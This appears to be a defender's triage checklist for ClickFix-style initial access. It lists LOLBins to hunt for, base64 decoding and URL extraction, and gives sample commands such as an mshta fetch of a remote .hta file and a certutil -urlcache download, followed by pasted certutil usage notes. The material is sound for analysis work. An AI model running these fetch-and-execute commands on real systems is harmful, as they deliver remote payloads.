  1. Identify the Initial Access command.
      Look for Powershell, cmd, mshta, rundll32, curl, bitsadmin
      Eg: mshta http://site/file.hta
  2. Decode if encoded
      -enc
      -base64
  Decode:
      echo "BASE64 STRING" | base64 -d
  3. Extract URLs:
      Find http, https
      These are payload, C2,Staging.
  4. Identify Download Method
      Common ClickFix download commands:
      Powershell: Invoke-WebRequest(IWR), curl, wget
      CMD: certutil -urlcache -split -f 
            bitsadmin /transfer
        Eg:
          certutil -urlcache -split -f https://example.com/certfile.cer output.cer
          -f: Forces overwrite if the file exists.
        The first argument after -f is the URL to fetch.
        The last argument is the local file name to save.

certutil -urlcache crl http://ca.example.com/ca.crl -split -f
How it works: When run with a URL, certutil -urlcache -split -f will:
Fetch the specified file from the URL (even if cached).
Save it locally under the given filename.
If the file contains multiple ASN.1 objects (e.g., certificate chain), it will split them into separate .cer, .crl, or .sst files in the current directory.
Another Example – Force re-download of a CRL and split:

certutil -urlcache crl http://ca.example.com/ca.crl -split -f
Copy
This forces retrieval of the CRL from the CA, overwrites any existing cached copy, and splits it into components.

Important notes:
Without specifying delete, -urlcache fetches or displays entries; with a URL, it downloads.
Use certutil -urlcache * delete to clear all cached URLs if needed.
The -split option is useful for extracting individual certificates from bundles.
Always ensure you trust the source URL before downloading, as this command will write files directly to disk.
This combination is often used by administrators for troubleshooting certificate chains or extracting specific certs from downloaded bundles.



